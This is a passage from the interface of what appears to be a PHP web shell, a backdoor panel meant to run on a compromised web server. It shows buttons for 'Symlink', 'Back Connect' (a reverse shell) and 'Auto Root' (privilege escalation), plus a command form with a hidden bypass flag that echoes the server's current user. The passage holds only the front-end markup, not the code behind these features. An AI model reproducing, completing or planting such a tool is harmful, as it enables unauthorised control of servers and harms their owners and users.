g>
            Symlink
        </button>
        <button onclick="showBackconnectModal()" class="btn btn-sm" style="border-color: #ef4444; color: #ef4444;">
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 12h-4l-3 9L9 3l-3 9H2"/></svg>
            Back Connect
        </button>
        <button onclick="showAutoRootModal()" class="btn btn-sm" style="border-color: #f59e0b; color: #f59e0b;">
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="M9 12l2 2 4-4"/></svg>
            Auto Root
        </button>
    </div>

    <!-- Command -->
    <div class="cmd-section">
        <form method="POST" id="cmdForm">
            <input type="hidden" name="use_bypass" id="useBypassField" value="0">
            <div class="cmd-prompt">
                <span class="cmd-user"><?php echo @get_current_user() 